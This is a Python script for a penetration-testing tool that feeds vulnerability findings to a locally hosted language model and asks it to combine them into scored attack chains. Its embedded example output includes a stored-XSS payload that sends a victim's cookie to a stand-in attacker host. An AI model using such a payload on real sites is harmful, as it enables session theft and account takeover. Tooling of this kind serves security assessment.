"""
Manticore Chain Synthesis Engine

Reads Shannon's vulnerability findings, sends them to Qwen2.5-72B
on AMD MI300X via vLLM in a single long-context inference call,
and outputs compound attack chains with severity upgrades.
"""

import json
import os
import sys
import glob
from pathlib import Path
from openai import OpenAI

VLLM_BASE_URL = os.environ.get("ANTHROPIC_BASE_URL", "http://localhost:8000/v1").replace("/v1", "") + "/v1"
MODEL = os.environ.get("ANTHROPIC_MEDIUM_MODEL", "Qwen/Qwen2.5-72B-Instruct")
MAX_TOKENS = 8192

SYNTHESIS_PROMPT = """You are a penetration tester analyzing a completed security assessment.

Your task: identify COMPOUND ATTACK CHAINS by combining multiple vulnerabilities into sequences that achieve higher impact than any single finding alone.

STEP 1 — Read and understand the application:
Read the APPLICATION CONTEXT below. Understand what the app does, what data it holds, and what would hurt most if compromised (accounts, payments, admin access, data exfiltration).

STEP 2 — Read all findings:
Read every finding in INDIVIDUAL FINDINGS. Note the vulnerability class, affected endpoint, and severity of each one.

STEP 3 — Find chains:
Look for sequences where:
- Finding A gives the attacker information or access needed to exploit Finding B
- Finding B then enables Finding C
- The final outcome is worse than any single finding alone

Valid chain examples:
- IDOR (get victim user ID) → Session token in URL (forge session) → XSS (execute in victim context) = Account Takeover (CRITICAL)
- SQLi (extract credentials) → Weak password storage (crack hash) → Auth bypass (admin access) = Full admin compromise (CRITICAL)
- SSRF (internal network access) → Internal admin panel (no auth on internal) = Infrastructure compromise (HIGH)

STEP 4 — Score each chain:
Use CVSS 3.1. Score based on the FINAL impact of the full chain, not individual steps.
A chain that achieves full account takeover = 9.0-10.0 regardless of component scores.

STEP 5 — Write output as JSON only.

CRITICAL RULES:
- Only report chains you can fully justify step by step
- Do not invent vulnerabilities not present in the findings
- A chain needs minimum 2 findings from the list
- If no valid chains exist, return an empty chains array
- Your entire response must be valid JSON — no text before or after

APPLICATION CONTEXT:
{app_context}

INDIVIDUAL FINDINGS:
{findings}

EXAMPLE OUTPUT (use this exact structure):
{{
  "chains": [
    {{
      "id": "MANTICORE-001",
      "title": "Full Account Takeover via IDOR + Session Forgery + Stored XSS",
      "severity": "CRITICAL",
      "cvss_score": 9.8,
      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
      "cwe_ids": ["CWE-639", "CWE-598", "CWE-79"],
      "findings_used": ["FINDING-001", "FINDING-002", "FINDING-004"],
      "severity_before": {{
        "ratings": ["Medium (6.5)", "Low (4.3)", "Medium (6.1)"],
        "highest": "Medium (6.5)"
      }},
      "severity_after": "CRITICAL (9.8)",
      "summary": "An unauthenticated attacker can take over any user account by chaining three vulnerabilities. First, IDOR at /api/user exposes victim user IDs. Second, the session token transmitted in the URL can be forged using the victim ID. Third, a stored XSS payload executes in the victim browser and exfiltrates the forged session to the attacker.",
      "impact": "Complete takeover of any user account including administrators. Full access to user data, account actions, and privilege escalation to admin.",
      "steps": [
        "Navigate to GET /api/user?id=<sequential_id> to enumerate valid user IDs",
        "Construct forged session token using victim user ID from step 1 via /login?session=<forged>",
        "Deliver stored XSS payload to victim via /profile/bio field: <script>fetch('https://attacker.com/?c='+document.cookie)</script>",
        "When victim visits their profile, XSS fires and exfiltrates their session cookie to attacker",
        "Attacker uses exfiltrated session to authenticate as victim"
      ],
      "affected_endpoints": ["/api/user", "/login", "/profile/bio"],
      "remediation": "1) Implement authorization checks on /api/user to verify requester owns the resource. 2) Rotate session tokens server-side, never transmit in URL. 3) Apply output encoding on all user-supplied content rendered in HTML."
    }}
  ],
  "total_chains": 1,
  "critical_count": 1,
  "high_count": 0
}}

Now analyze the findings and return your JSON output:"""


def load_findings(deliverables_dir: str) -> dict:
    findings = {}
    pattern = os.path.join(deliverables_dir, "*exploitation_queue*.json")
    for filepath in glob.glob(pattern):
        vuln_class = Path(filepath).stem.replace("_exploitation_queue", "").replace("exploitation_queue_", "")
        with open(filepath) as f:
            try:
                data = json.load(f)
                if isinstance(data, list):
                    findings[vuln_class] = data
                elif isinstance(data, dict) and "vulnerabilities" in data:
                    findings[vuln_class] = data["vulnerabilities"]
                elif isinstance(data, dict) and "findings" in data:
                    findings[vuln_class] = data["findings"]
            except json.JSONDecodeError:
                continue
    return findings


def load_app_context(deliverables_dir: str) -> str:
    context_parts = []
    for filename in ["pre_recon_deliverable.md", "recon_deliverable.md"]:
        filepath = os.path.join(deliverables_dir, filename)
        if os.path.exists(filepath):
            with open(filepath) as f:
                content = f.read()
                context_parts.append(f"=== {filename} ===\n{content[:8000]}")
    return "\n\n".join(context_parts) if context_parts else "No context available."


def format_findings_for_prompt(findings: dict) -> str:
    lines = []
    finding_id = 1
    for vuln_class, items in findings.items():
        lines.append(f"\n### {vuln_class.upper()} FINDINGS")
        for item in items:
            lines.append(f"\n[FINDING-{finding_id:03d}]")
            lines.append(json.dumps(item, indent=2))
            finding_id += 1
    return "\n".join(lines) if lines else "No findings available."


def synthesize(deliverables_dir: str, output_path: str) -> dict:
    print(f"[Manticore] Loading findings from {deliverables_dir}")
    findings = load_findings(deliverables_dir)

    if not findings:
        print("[Manticore] No findings found. Run the pentest pipeline first.")
        sys.exit(1)

    total = sum(len(v) for v in findings.values())
    print(f"[Manticore] Loaded {total} findings across {len(findings)} vuln classes")

    app_context = load_app_context(deliverables_dir)
    findings_text = format_findings_for_prompt(findings)

    prompt = SYNTHESIS_PROMPT.format(
        app_context=app_context,
        findings=findings_text,
    )

    token_estimate = len(prompt) // 4
    print(f"[Manticore] Prompt ~{token_estimate:,} tokens — sending to {MODEL} on AMD MI300X")

    client = OpenAI(base_url=VLLM_BASE_URL, api_key="placeholder")

    response = client.chat.completions.create(
        model=MODEL,
        messages=[{"role": "user", "content": prompt}],
        max_tokens=MAX_TOKENS,
        temperature=0.1,
    )

    raw_output = response.choices[0].message.content.strip()

    try:
        chains = json.loads(raw_output)
    except json.JSONDecodeError:
        import re
        json_match = re.search(r'\{.*\}', raw_output, re.DOTALL)
        if json_match:
            chains = json.loads(json_match.group())
        else:
            print("[Manticore] ERROR: Model output was not valid JSON")
            print(raw_output[:500])
            sys.exit(1)

    with open(output_path, "w") as f:
        json.dump(chains, f, indent=2)

    print(f"[Manticore] {chains.get('total_chains', 0)} chain(s) found — written to {output_path}")
    return chains


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python synthesize.py <deliverables_dir> [output_path]")
        sys.exit(1)

    deliverables_dir = sys.argv[1]
    output_path = sys.argv[2] if len(sys.argv) > 2 else os.path.join(deliverables_dir, "manticore_chains.json")
    synthesize(deliverables_dir, output_path)
